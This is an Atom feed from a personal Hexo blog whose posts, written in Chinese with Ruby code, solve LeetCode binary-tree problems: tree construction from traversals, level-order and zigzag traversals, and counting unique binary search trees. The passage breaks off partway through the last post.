<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jack Pan</title>
  
  <subtitle>Jack Pan的个人网站</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://jack0pan.github.io/"/>
  <updated>2018-05-04T14:33:00.420Z</updated>
  <id>http://jack0pan.github.io/</id>
  
  <author>
    <name>Jack Pan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Construct Binary Tree from Traversal</title>
    <link href="http://jack0pan.github.io/2018/05/04/Construct-Binary-Tree-from-Traversal/"/>
    <id>http://jack0pan.github.io/2018/05/04/Construct-Binary-Tree-from-Traversal/</id>
    <published>2018-05-04T14:31:49.000Z</published>
    <updated>2018-05-04T14:33:00.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Construct-Binary-Tree-from-Traversal"><a href="#Construct-Binary-Tree-from-Traversal" class="headerlink" title="Construct Binary Tree from Traversal"></a>Construct Binary Tree from Traversal</h1><h2 id="105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal"><a href="#105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal" class="headerlink" title="105. Construct Binary Tree from Preorder and Inorder Traversal"></a>105. Construct Binary Tree from Preorder and Inorder Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given preorder and inorder traversal of a tree, construct the binary tree.</p><p>Note:<br>You may assume that duplicates do not exist in the tree.</p><p>For example, given<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preorder = [3,9,20,15,7]</span><br><span class="line">inorder = [9,3,15,20,7]</span><br></pre></td></tr></table></figure></p><p>Return the following binary tree:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>通过前序遍历数组我们可以知道第一个元素为根节点，然后去中序遍历中找到该元素，它左边的为左子树，右边的为右子树。这样递归遍历两个数组即可得到二叉树。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; preorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; inorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_tree</span><span class="params">(preorder, inorder)</span></span></span><br><span class="line">  hash = &#123;&#125;</span><br><span class="line">  inorder.each_with_index <span class="keyword">do</span> <span class="params">|v, i|</span></span><br><span class="line">    hash[v] = i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  _build_tree(preorder, <span class="number">0</span>, preorder.length - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.length - <span class="number">1</span>, hash)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _build_tree<span class="params">(preorder, pre_left, pre_right, inorder, in_left, in_right, hash)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> pre_left &gt; pre_right <span class="keyword">or</span> in_left &gt; in_right</span><br><span class="line">  root = TreeNode.new(preorder[pre_left])</span><br><span class="line">  delta = hash[root.val] - in_left</span><br><span class="line">  root.left = _build_tree(preorder, pre_left + <span class="number">1</span>, pre_left + delta, inorder, in_left, hash[root.val] - <span class="number">1</span>, hash)</span><br><span class="line">  root.right = _build_tree(preorder, pre_left + delta + <span class="number">1</span>, pre_right, inorder, hash[root.val] + <span class="number">1</span>, in_right, hash)</span><br><span class="line">  <span class="keyword">return</span> root</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="106-Construct-Binary-Tree-from-Inorder-and-Postorder-Traversal"><a href="#106-Construct-Binary-Tree-from-Inorder-and-Postorder-Traversal" class="headerlink" title="106. Construct Binary Tree from Inorder and Postorder Traversal"></a>106. Construct Binary Tree from Inorder and Postorder Traversal</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given inorder and postorder traversal of a tree, construct the binary tree.</p><p>Note:<br>You may assume that duplicates do not exist in the tree.</p><p>For example, given<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inorder = [9,3,15,20,7]</span><br><span class="line">postorder = [9,15,7,20,3]</span><br></pre></td></tr></table></figure></p><p>Return the following binary tree:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>通过后序遍历数组我们可以知道最后一个元素为根节点，然后去中序遍历中找到该元素，它左边的为左子树，右边的为右子树。这样递归遍历两个数组即可得到二叉树。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; inorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; postorder</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;TreeNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_tree</span><span class="params">(inorder, postorder)</span></span></span><br><span class="line">  hash = &#123;&#125;</span><br><span class="line">  inorder.each_with_index <span class="keyword">do</span> <span class="params">|v, i|</span></span><br><span class="line">    hash[v] = i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  _build_tree(postorder, <span class="number">0</span>, postorder.length - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.length - <span class="number">1</span>, hash)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _build_tree<span class="params">(postorder, post_left, post_right, inorder, in_left, in_right, hash)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span> <span class="keyword">if</span> post_left &gt; post_right <span class="keyword">or</span> in_left &gt; in_right</span><br><span class="line">  root = TreeNode.new(postorder[post_right])</span><br><span class="line">  delta = hash[root.val] - in_left</span><br><span class="line">  root.left = _build_tree(postorder, post_left, post_left + delta - <span class="number">1</span>, inorder, in_left, hash[root.val] - <span class="number">1</span>, hash)</span><br><span class="line">  root.right = _build_tree(postorder, post_left + delta, post_right - <span class="number">1</span>, inorder, hash[root.val] + <span class="number">1</span>, in_right, hash)</span><br><span class="line">  <span class="keyword">return</span> root</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Construct-Binary-Tree-from-Traversal&quot;&gt;&lt;a href=&quot;#Construct-Binary-Tree-from-Traversal&quot; class=&quot;headerlink&quot; title=&quot;Construct Binary Tre
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Binary Tree Level Order Traversal</title>
    <link href="http://jack0pan.github.io/2018/05/04/Binary-Tree-Level-Order-Traversal/"/>
    <id>http://jack0pan.github.io/2018/05/04/Binary-Tree-Level-Order-Traversal/</id>
    <published>2018-05-04T13:57:18.000Z</published>
    <updated>2018-05-04T14:29:10.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Binary-Tree-Level-Order-Traversal"><a href="#Binary-Tree-Level-Order-Traversal" class="headerlink" title="Binary Tree Level Order Traversal"></a>Binary Tree Level Order Traversal</h1><h2 id="102-Binary-Tree-Level-Order-Traversal"><a href="#102-Binary-Tree-Level-Order-Traversal" class="headerlink" title="102. Binary Tree Level Order Traversal"></a>102. Binary Tree Level Order Traversal</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>二叉树的广度优先遍历。遍历当前层的同时，把子节点放入队列中，这样一层一层遍历，直到队列为空。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result &lt;&lt; level</span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="107-Binary-Tree-Level-Order-Traversal-II"><a href="#107-Binary-Tree-Level-Order-Traversal-II" class="headerlink" title="107. Binary Tree Level Order Traversal II"></a>107. Binary Tree Level Order Traversal II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the bottom-up level order traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its bottom-up level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [15,7],</span><br><span class="line">  [9,20],</span><br><span class="line">  [3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这题和<a href="https://leetcode.com/problems/binary-tree-level-order-traversal/description/" target="_blank" rel="noopener">前面题</a>一样，只需把最后结构逆序即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level_order_bottom</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    result &lt;&lt; level</span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result.reverse</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="103-Binary-Tree-Zigzag-Level-Order-Traversal"><a href="#103-Binary-Tree-Zigzag-Level-Order-Traversal" class="headerlink" title="103. Binary Tree Zigzag Level Order Traversal"></a>103. Binary Tree Zigzag Level Order Traversal</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Given a binary tree, return the zigzag level order traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between).</p><p>For example:<br>Given binary tree [3,9,20,null,null,15,7],<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure></p><p>return its zigzag level order traversal as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>这题在<a href="https://leetcode.com/problems/binary-tree-level-order-traversal/" target="_blank" rel="noopener">Binary Tree Level Order Traversal</a>基础上，加个标记，偶数行做一下反转即可。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zigzag_level_order</span><span class="params">(root)</span></span></span><br><span class="line">  result, queue = [], []</span><br><span class="line">  <span class="keyword">return</span> result <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  queue &lt;&lt; root</span><br><span class="line">  reverse = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> queue.empty?</span><br><span class="line">    level = []</span><br><span class="line">    next_level = []</span><br><span class="line">    queue.each <span class="keyword">do</span> <span class="params">|node|</span></span><br><span class="line">      level &lt;&lt; node.val</span><br><span class="line">      next_level &lt;&lt; node.left <span class="keyword">if</span> node.left</span><br><span class="line">      next_level &lt;&lt; node.right <span class="keyword">if</span> node.right</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> reverse</span><br><span class="line">      result &lt;&lt; level.reverse</span><br><span class="line">      reverse = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result &lt;&lt; level</span><br><span class="line">      reverse = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    queue = next_level</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Binary-Tree-Level-Order-Traversal&quot;&gt;&lt;a href=&quot;#Binary-Tree-Level-Order-Traversal&quot; class=&quot;headerlink&quot; title=&quot;Binary Tree Level Order Tr
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Unique Binary Search Trees</title>
    <link href="http://jack0pan.github.io/2018/05/03/Unique-Binary-Search-Trees/"/>
    <id>http://jack0pan.github.io/2018/05/03/Unique-Binary-Search-Trees/</id>
    <published>2018-05-03T13:44:32.000Z</published>
    <updated>2018-05-03T14:35:34.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unique-Binary-Search-Trees"><a href="#Unique-Binary-Search-Trees" class="headerlink" title="Unique Binary Search Trees"></a>Unique Binary Search Trees</h1><h2 id="96-Unique-Binary-Search-Trees"><a href="#96-Unique-Binary-Search-Trees" class="headerlink" title="96. Unique Binary Search Trees"></a>96. Unique Binary Search Trees</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given n, how many structurally unique BST’s (binary search trees) that store values 1 … n?</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: 5</span><br><span class="line">Explanation:</span><br><span class="line">Given n = 3, there are a total of 5 unique BST&apos;s:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>解决思路就是以任意一个数为根，比它小的数为左子树，大的为右子树，二叉搜索树的数量就是左子树数量乘以右子树的数量，总数就是以每个数为根节点的二叉搜索树的总和。</p><p>总结成公式为：<br><img src="http://junzhepanblog.qiniudn.com/unique-binary-search-trees/catalan.png" alt="卡特兰数"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_trees</span><span class="params">(n)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> n == <span class="number">0</span></span><br><span class="line">  result = Array.new(n + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">  result[<span class="number">0</span>], result[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  (<span class="number">2</span>..n).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    i.times.each <span class="keyword">do</span> <span class="params">|j|</span></span><br><span class="line">      result[i] += result[j] * result[i - j - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> result[n]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^2)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="95-Unique-Binary-Search-Trees"><a href="#95-Unique-Binary-Search-Trees" class="headerlink" title="95. Unique Binary Search Trees"></a>95. Unique Binary Search Trees</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given an integer n, generate all structurally unique BST’s (binary search trees) that store values 1 … n.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">Explanation:</span><br><span class="line">The above output corresponds to the 5 unique BST&apos;s shown below:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>思路跟<a href="https://leetcode.com/problems/unique-binary-search-trees/description/" target="_blank" rel="noopener">Unique Binary Search Trees</a>的类似。</p><ul><li>每选一个节点为根，就要递归求解左右子树的所有情况。</li><li>遍历左右子树的所有情况，把当前节点和左右子树拼接起来。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 